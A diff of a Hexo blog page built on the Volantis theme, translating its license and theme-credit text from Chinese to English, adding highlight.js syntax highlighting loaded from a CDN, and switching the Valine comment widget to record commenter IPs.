-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -732,9 +843,9 @@ Sea of Quills  题目给了r...</p>
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -867,6 +978,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1080,7 +1193,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1136,6 +1249,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
